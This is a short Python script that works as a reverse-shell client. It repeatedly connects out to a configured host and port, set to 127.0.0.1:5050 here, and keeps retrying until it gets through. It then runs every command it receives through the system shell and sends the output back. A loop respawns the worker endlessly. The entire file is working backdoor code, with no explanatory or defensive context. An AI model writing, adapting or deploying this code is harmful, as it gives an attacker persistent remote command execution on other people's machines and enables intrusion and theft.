import os
import time
import socket
import subprocess
from multiprocessing import Process

host = "127.0.0.1"
port = 5050

def receiver(s):
    """Receive system commands and execute them."""
    while True:
        cmd_bytes = s.recv(4096) # 4096 is better for heavy transfers!
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            x1 = f'{os.getcwd()}>'
            s.send(x1.encode())
            continue
        if len(cmd) == 2 and ":" in cmd:
            os.chdir(cmd)
            x2 = f'{os.getcwd()}>'
            s.send(x2.encode())

        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            x3 = f'{os.getcwd()}>'
            s.sendall(data + x3.encode())
        else:
            print("Connection Closed")
            break

def connect():
    """Establish a connection to the address, then call receiver()"""
    s = socket.socket()
    while True:
        try:
            s.connect((host, port))
            print("Connection Established.")
            x5 = f'{os.getcwd()}>'
            s.send(x5.encode())
            break
        except Exception as e:
            print("Connection Error: " + str(e))
            time.sleep(2)
            continue
    receiver(s)

if __name__ == "__main__":
    while True:
        try:
            print("Creating new worker...")
            p = Process(target=connect)
            p.start()
            p.join()
            print("Worker terminated\n")
        except:
            ...